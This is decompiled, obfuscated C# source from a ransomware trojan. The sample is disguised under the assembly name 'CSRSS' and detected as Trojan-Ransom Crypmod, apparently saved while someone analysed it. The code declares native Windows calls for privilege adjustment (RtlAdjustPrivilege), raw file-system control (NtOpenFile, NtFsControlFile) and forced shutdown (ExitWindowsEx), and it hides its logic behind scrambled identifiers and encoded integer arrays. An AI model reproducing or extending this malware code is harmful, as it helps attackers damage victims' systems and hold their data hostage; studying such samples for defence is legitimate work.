// Decompiled with JetBrains decompiler
// Type: _d3c219d6ed3b8b60烠㫩핐삄앟랎._9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒
// Assembly: CSRSS, Version=10.0.19041.546, Culture=neutral, PublicKeyToken=null
// MVID: 922CE0F6-AFCA-47F9-840F-4CAFB7753FD6
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe.exe

using Microsoft.Win32.SafeHandles;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace _d3c219d6ed3b8b60烠㫩핐삄앟랎
{
  public static class _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒
  {
    private const string _9afca341083800c2蝩欓풥鶢萧쭢困楘얕꼇 = "ntdll.dll";
    private const string _3db2e4afc887e04f뀯䏩醻垗违岉㹷춒왛씑ࡆ删湔鬵瑋숵버염꘠빨並뎧ꁈ股뵪料끈ꏔᾔ퍀 = "kernel32.dll";
    private const string _083f29baa16872d2縼鵢粩ݧ = "user32.dll";

    [DllImport("ntdll.dll")]
    public static extern uint NtOpenFile(
      out SafeFileHandle _ebe52bb204efeadf쓮帾ཥ肱볺㒤멥侹叴辺漇䭨꿹놝Լ䦭꾒ꆙ꣒Ṝ獾퍹슌,
      ulong _ada415a8886f069dḸ컽뉿좩坖丿㽬㣱寗즈ﳛ䏲႒ஃ性ᜆ泙Ā큗굥곚塚诌హꎜ뛹賵拐㘗언ظ컷礳䒴泈쭾忱켽헥ߥ,
      ref _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒._c0aa91fe1d1aa494㯬㮈흖ꝝ恉ﲼ易察뱔魤첬Ҳᶱ㱤塾㛣껹绫修힟묊縹浊ẞ엢蠳䞠뼿츚룎桙䊄龜骘憎 _fa04305cbf5c2dc2儿최쏲뎹룁䀊ꙿ岼韕鷚狾ьᾃᡐミ屖꩖㸑緞鱽,
      ref _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒._96f8b72c402ec510憥㯾Ҵ烙㴆㾩픪㤩ᬗ댈㶆뮸뿾걐畊䠀㣌삮ኽ贝㒴趑倸늛䕭ぉ _54a6ae48cb46ed65Ѕ玠씆Ꮆꛓ붚鄸爪ꜥ笝ഗ쪣嬓瓀ጜꗊ䲬쪂迉쒎औ禿䂹蠪쯕損㑗哃衍銮걖焫忞躑乤狠ﺔꕪᠩ,
      ulong _0dcad2772c6458aaỿ젓컼㷦櫢ⰷ댉鉃ጊ鈮盳兛쮗럀둓翂丑,
      ulong _687a51e2c6fd263a㥅嶢ꉇ埩읟ᶺ꺘趘菪ꤴ䆅迏Ꜻ茭멋);

    [DllImport("ntdll.dll")]
    public static extern uint NtFsControlFile(
      SafeFileHandle _ebe52bb204efeadf꿝㚭衄Ͼ㡲뗕躆綐䡾펡㛤琟,
      IntPtr _214791883540ad25薟먏갤㿹龒蛠ꭶ饑떽ĵ뭐洙뫌袽໒毨狑쥀텇璒馺ಞ隁퓿䫴㡮,
      IntPtr _985ba3a449f0accb겞㾷ᙯ텀핳厞ᅿﵓ쵶猬欀આﬖᘎ賢힢㗹계,
      IntPtr _55e1481b4e094c45孲䗲薀ᨖ덹ᅞ䌞ｕ웝綽㱨뒦튆艍䃎ﺓ瓄ꑷᑃ썟㒤끊詳㐻혽ಋ쉣퓻,
      ref _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒._96f8b72c402ec510憥㯾Ҵ烙㴆㾩픪㤩ᬗ댈㶆뮸뿾걐畊䠀㣌삮ኽ贝㒴趑倸늛䕭ぉ _54a6ae48cb46ed65ᐤᔏ箲䍥騐뫈㘩㿸ᱼ咝웟굾向㱐眴갷鰈痼笷,
      ulong _c8ad6f14d0f3a5d0ᝣヹ䰯ᔥ웦狥袩雼汯㐖ꮔ䂨䮥遣먆濺鰳訜冚ꕵᆣ랞懞欤㻂Ⱇ빟賔ᵎ族博衼恑㯻嗺툺먿,
      IntPtr _091eecec16b719c9婋䉔䫹窪녕흺虷鼑窳黡怖ଧᔂ᪕㾋뎲ꡣ儭꼵뻖쟂,
      ulong _5b6d85e0d0399c0c鈈頻莼ਆ뺇㰆븣ᜌ嗜앍錽䦄䫺ᙈ甶蚢३查숯笭釕㡙䟨ጘ堚䄤搚訠灂ڞ㸯茶莘蛈诉佮푯,
      IntPtr _3dd7f0e0a3562b64㐝斚삿欈摸硊檣볜뾝Ὲ垡㮽䪚恴ﭽ斺㠊瓙겘瞶ꖛ阾떸䳝阏儏ꀣ韔ꆒ龯秙䃱辴咊仲,
      ulong _eac0ed53558e1fc3韯䇶놬굩頉碿归亴䶩侮닟뮆ﷴ㤈槧ⵄ聘痝Ѥ祛赤貽뉻);

    [DllImport("ntdll.dll")]
    public static extern ulong RtlNtStatusToDosError(ulong _45a32e1191788199뗓끐㑏㣈鈳);

    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(
      ulong _fa3ef4e114b711db螅폛ᧄ綕ꬭ펖,
      bool _48aff8490d34409fﻖ봯䞗剟耨ﻛ懔箲쑃餓莉儻择鰖㔁兑댙엖ሰ浆鯵픗잊徚䅩鞴㝄ꎆ벅ꤵ矓殈珓,
      bool _8d6d0deaeba2428c脪阰둍䈥ᒈ趉槌蹝켒ὁ豂앙䩳烶涮鮯坞镀鷊罴,
      ref bool _7a2c4547b5127da3ఖ팦);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(
      IntPtr _0b7a369c11d0753dᢦ엶삛馫鲮㕩㱪ボ뫩펃㘕穎窅觏뢛瑐ҭᓥअ늛냚姜桪ꇵ儢㦱毋쀔ꬠ퇡栯禑ꂵ찆ⲇ㿱겾궣켰듓터瑀);

    [DllImport("kernel32.dll")]
    public static extern bool GetFileSizeEx(
      SafeFileHandle _90e1fea45946d651咼嘊탡,
      out ulong _b8b922de9dcf9d00ꪮ뱶䒣篹풣ȓ㮵ὁ꿅);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("user32.dll")]
    private static extern bool ExitWindowsEx(
      uint _85704f1e4fc20a72㞫揼縧ꖉ娡斶욊葹頀띅谀獿醄ꖃ仍㜓䧞뻭喾佭ᶽ朴巂,
      int _7eebb7cfaca9b3c4鸼ӑ罷漌焎矿耀뜘往ꔬ跮拋樭ᒶ逳ᗖ㲑귅餼㓆诐傶䏌笌䡖뢹끠媓력祼挂깂ऽ胊ઇ嚃쏀炢ᵺ㬫偩뒹Ṏ쩉ⶒ즃ꨧ);

    public static string _77877537145b99f7㳡纐懅芗ᭇ职껈婉膌㐝罶Εᝩདྷ短胞㣁측隲ﭝ罈᥋瞮钵觃癉롚킜듿繇述켬闥芚鸮圙絜㹁걄爳ڰ慈ﺽꉒ(
      ulong _b46b772bdf61732c䞔䛪ᰊ廟ꭝ䏛栳棹롽)
    {
      return new Win32Exception((int) _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒.RtlNtStatusToDosError(_b46b772bdf61732c䞔䛪ᰊ廟ꭝ䏛栳棹롽)).ToString();
    }

    public static void _6f46f6a166af4a4d귛鏍ጝ瑷藚悤꼒썹ฮ椐ᢘઊꨆ홖銀ꗢ뮭苋ѯ羪跌挭()
    {
      object obj = (object) null;
      int index = 0;
      object[] objArray = new object[5]
      {
        (object) new int[6]
        {
          90,
          -68723455,
          90,
          68723505,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          -1939294417,
          90,
          1870570948,
          10,
          90,
          68723505,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          -1939294259,
          90,
          1870570948,
          10,
          90,
          68723505,
          10,
          180
        },
        (object) new int[6]
        {
          90,
          -68723402,
          90,
          68723505,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          -1939294310,
          90,
          1870570948,
          10,
          90,
          68723505,
          10,
          180
        }
      };
      for (; index < 5; ++index)
      {
        switch (C2V1PCy9F.V3SsUmjVJAqQh((int[]) objArray[index], 0, 0))
        {
          case 103:
            _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒.ExitWindowsEx((uint) C2V1PCy9F.V3SsUmjVJAqQh(new int[13]
            {
              90,
              914126512,
              190,
              210,
              220,
              90,
              914126512,
              190,
              200,
              220,
              240,
              230,
              180
            }, 0, 0), C2V1PCy9F.V3SsUmjVJAqQh(new int[13]
            {
              90,
              914126512,
              90,
              914126512,
              190,
              210,
              220,
              190,
              210,
              220,
              270,
              230,
              180
            }, 0, 0));
            break;
          case 142:
            int num = (int) obj;
            break;
        }
      }
    }

    public struct _96f8b72c402ec510憥㯾Ҵ烙㴆㾩픪㤩ᬗ댈㶆뮸뿾걐畊䠀㣌삮ኽ贝㒴趑倸늛䕭ぉ
    {
      public uint _c2a5e95505f4d0d7䇝믾辶㶨숎插កꄶ厣艘昤諦鲫ᥑ䫆ﶤ䲅藥㗇뉓輻很嗵쌣鱽舙뎑機놕즒䦒궾ᅥ猳깶;
      public IntPtr _c76d1abe0388a5b8Ⱬ踻奄焋뀚ຫ㳐ꅏ끴们斮篾읯軸Ҝ䖐;
    }

    public struct _d8463bec0a849d38帘껐쀡缮 : IDisposable
    {
      public ushort _77a5ed74d507e67f粧夙跂鰫콇枒;
      public ushort _44beaf781f75be9c闧聿䒡実춛엧駇䟋ꁣʹ쿾㶗逃᱃;
      public IntPtr _86cb9ded1cb33a40㞕傸聱㭸옩Ե鯊ꌠꈏ쯗륋4ᨂg샊ᨏⶤ댊梨ㄞ;

      public _d8463bec0a849d38帘껐쀡缮(string _7898ec674c2b231e䝌幃륗꣓ಸ弆ᓦ쒶ﬁ)
      {
        this._77a5ed74d507e67f粧夙跂鰫콇枒 = (ushort) (_7898ec674c2b231e䝌幃륗꣓ಸ弆ᓦ쒶ﬁ.Length * C2V1PCy9F.V3SsUmjVJAqQh(new int[25]
        {
          90,
          914126512,
          190,
          210,
          220,
          90,
          914126512,
          190,
          200,
          220,
          240,
          90,
          1086384794,
          190,
          210,
          220,
          90,
          1086384794,
          190,
          200,
          220,
          240,
          240,
          230,
          180
        }, 0, 0));
        this._44beaf781f75be9c闧聿䒡実춛엧駇䟋ꁣʹ쿾㶗逃᱃ = (ushort) ((int) this._77a5ed74d507e67f粧夙跂鰫콇枒 + C2V1PCy9F.V3SsUmjVJAqQh(new int[25]
        {
          90,
          914126512,
          190,
          210,
          220,
          90,
          914126512,
          190,
          200,
          220,
          240,
          90,
          1086384794,
          190,
          210,
          220,
          90,
          1086384794,
          190,
          200,
          220,
          240,
          240,
          230,
          180
        }, 0, 0));
        this._86cb9ded1cb33a40㞕傸聱㭸옩Ե鯊ꌠꈏ쯗륋4ᨂg샊ᨏⶤ댊梨ㄞ = Marshal.StringToHGlobalUni(_7898ec674c2b231e䝌幃륗꣓ಸ弆ᓦ쒶ﬁ);
      }

      public void Dispose()
      {
        int index = 0;
        object[] objArray = new object[7]
        {
          (object) new int[12]
          {
            90,
            1533845162,
            90,
            821827789,
            10,
            90,
            1870570948,
            10,
            90,
            68723505,
            10,
            180
          },
          (object) new int[6]
          {
            90,
            -68723378,
            90,
            68723505,
            10,
            180
          },
          (object) new int[6]
          {
            90,
            -68723297,
            90,
            68723505,
            10,
            180
          },
          (object) new int[9]
          {
            90,
            -1939294410,
            90,
            1870570948,
            10,
            90,
            68723505,
            10,
            180
          },
          (object) new int[12]
          {
            90,
            1533845086,
            90,
            821827789,
            10,
            90,
            1870570948,
            10,
            90,
            68723505,
            10,
            180
          },
          (object) new int[9]
          {
            90,
            -1939294290,
            90,
            1870570948,
            10,
            90,
            68723505,
            10,
            180
          },
          (object) new int[9]
          {
            90,
            -1939294257,
            90,
            1870570948,
            10,
            90,
            68723505,
            10,
            180
          }
        };
        for (; index < 7; ++index)
        {
          switch (C2V1PCy9F.V3SsUmjVJAqQh((int[]) objArray[index], 0, 0))
          {
            case (int) sbyte.MaxValue:
              Marshal.FreeHGlobal(this._86cb9ded1cb33a40㞕傸聱㭸옩Ե鯊ꌠꈏ쯗륋4ᨂg샊ᨏⶤ댊梨ㄞ);
              break;
            case 163:
              this._86cb9ded1cb33a40㞕傸聱㭸옩Ե鯊ꌠꈏ쯗륋4ᨂg샊ᨏⶤ댊梨ㄞ = IntPtr.Zero;
              break;
          }
        }
      }

      public override string ToString() => Marshal.PtrToStringUni(this._86cb9ded1cb33a40㞕傸聱㭸옩Ե鯊ꌠꈏ쯗륋4ᨂg샊ᨏⶤ댊梨ㄞ);
    }

    public struct _c0aa91fe1d1aa494㯬㮈흖ꝝ恉ﲼ易察뱔魤첬Ҳᶱ㱤塾㛣껹绫修힟묊縹浊ẞ엢蠳䞠뼿츚룎桙䊄龜骘憎
    {
      public ulong _77a5ed74d507e67f蚝灢缅ॐ優把;
      public IntPtr _fbe8db34ff6bedb4䥍쨠ﭛﳧ뱲腱퍨愬䳹ㆯ㥊칦餯갊쌆삁떗껑葕歇Ҹ乿ꌭໜ澱䂺䍎诃垻ﾹ䥨龚熤陙㻜䋛쥝詂棹図磊烆;
      public IntPtr _8d9252b64a539998ᗬ맒갂夡懑ꅂ赣;
      public ulong _8a21e95d9718715f偠ꦧ퓅쇜瑩㿸탹蓦钓奌惊ဤ䴓쟽甭痦Ѐ蘈餆풦䐯廼䢋炕襦バ鑣䟦ꅚ앥뽉젬ꗺ依훔;
      public IntPtr _84e1c3cf2161354d穡둎䏄Ў헥ݴ뇨ﲞ邎杕욮㽎巊佁噋륊ഋ阿緪컥窥絔军삥蜑ꈗ섷껾瞅瘟媌ﲶ캫続祥䜳嵮阢ﷳ㻓誖䫤붉㴺䧲;
      public IntPtr _634f8cfcc29854bf쟨浣蠾ࢯ쀙ᚡ꼵ಫ玔ﰃ篘惫牸䳒㳐Д糈㖘ᐕ죯乮;
    }

    public struct _2c843e7eceb66574厼ᘛ甁梖靾婀嵴䪠鵍ṥ辍ⴟ맖泹㾚熇鎇䫶䜶욽ᄄﶀꞤﭘ㻔ꨏʄ螬ꯕꃶᾤ廏㳺ᄴ㓐祰螤炨湴渚
    {
      public ulong _e3d0a55368e6fff9䏓噦柁껟宦烈궢믻ሿ綍멾骓攳뎫啄庝硾䒢첵堼덉粄ﭖﹶ䯨튄꾠卒ꇑ읥㸉멍뛨;
      public ulong _9ce584cfe930eb3b뻟麸媊䙏샹勷䴌ꭥ鹘;
    }
  }
}
